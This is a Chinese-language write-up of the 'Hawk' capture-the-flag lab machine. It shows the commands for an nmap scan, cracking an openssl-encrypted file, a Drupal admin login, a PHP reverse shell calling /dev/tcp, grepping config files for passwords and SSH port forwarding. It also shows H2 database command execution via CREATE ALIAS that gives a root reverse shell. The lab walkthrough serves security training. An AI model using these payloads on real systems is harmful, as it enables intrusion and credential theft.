---
# Documentation: https://wowchemy.com/docs/managing-content/

title: "Hawk"
linktitle: "Hawk"
date: 2022-06-27T19:12:40+08:00
type: book
summary: ""
test: 
---


nmap

```bash
nmap -T4 -p- -vv -sV 10.10.10.102
```

![](image/image_V8BmusyG9K.png)

ftp匿名登录，发现` .drupal.txt.enc`

![](image/image_o8smoT8jrZ.png)

下载到本地查看发现是openssl文件base64编码了

```bash
wget -r ftp://10.10.10.102/messages/
```

![](image/image_qRyGC7or1o.png)

base64解码后尝试openssl解密

![](image/image_H7oosxVvaq.png)

解密脚本

<https://github.com/HrushikeshK/openssl-bruteforce>

```bash
python2 brute.py /usr/share/wordlists/rockyou.txt ciphers.txt drupal.txt
```

![](image/image_ZIH-1WkLLu.png)

获得密码：`PencilKeyboardScanner123`

80端口，`Drupal`

![](image/image_fMSmrJvab5.png)

发现ftp获得的密码就是Drupal的后台密码

`admin/PencilKeyboardScanner123`

发现可以启动`PHP filter`模块

![](image/image_FdujANC8t1.png)

可以解析文档中的php代码

![](image/image_VFAXuoqxum.png)

反弹shell

```bash
<?php 
echo "hack!!!";
echo exec("bash -c 'bash -i >& /dev/tcp/10.10.14.2/2333 0>&1'");
?>
```

保存就直接执行了

![](image/image_ubVzHfXi64.png)

![](image/image_dxm-M7DEYi.png)

敏感信息收集，从代码中找到了密码 `drupal4hawk`

```bash
find /var/www/html/ -name '*.php'|xargs grep 'password' 2>/dev/null
```

![](image/image_NN1r2Gb0-g.png)

./sites/default/settings.php

![](image/image_xZYvT115uB.png)

除了mysql，可能其他用户也使用了这个密码，最后试到ssh用户密码是`daniel/drupal4hawk`

![](image/image_x08BZkubAX.png)

切到bash

```bash
import pty;pty.spawn("/bin/bash")
```

![](image/image_gGPDPMFL6E.png)

提权

8082端口只允许本地访问，使用ssh把流量转发出去

![](image/image_4xAVWjZL6J.png)

![](image/image_FDqn2c4Tgq.png)

```bash
ssh -L 8888:127.0.0.1:8082 daniel@10.10.10.102
```

访问本地8082

![](image/image_N1aUqyyBua.png)

将jdbc url指定到root目录，直接连接

![](image/image_3IsVVlldrU.png)

连接成功：

![](image/image_zin9N4akxy.png)

这里有个注入问题：

<https://mthbernardes.github.io/rce/2018/03/14/abusing-h2-database-alias.html>

创建一个执行命令的函数 `SHELLEXEC111`

```bash
CREATE ALIAS SHELLEXEC111 AS $$ String shellexec(String cmd) throws java.io.IOException { java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter("\\A"); return s.hasNext() ? s.next() : "";  }$$;

```

![](image/image_0_di4f5FfE.png)

调用函数`SHELLEXEC111`

```bash
call SHELLEXEC111('id')
```

![](image/image_CYsFbkkW8h.png)

反弹shell

在daniel下创建一个shell

```bash
daniel@hawk:~$ cat /home/daniel/shell 
bash -i >& /dev/tcp/10.10.14.2/2444 0>&1
daniel@hawk:~$ chmod +x /home/daniel/shell 
daniel@hawk:~$ 

```

使用root执行/home/daniel/shell&#x20;

```bash
call SHELLEXEC111('bash /home/daniel/shell')

```

![](image/image_YQNgBuMcj3.png)

![](image/image_RnvkIoWzIp.png)
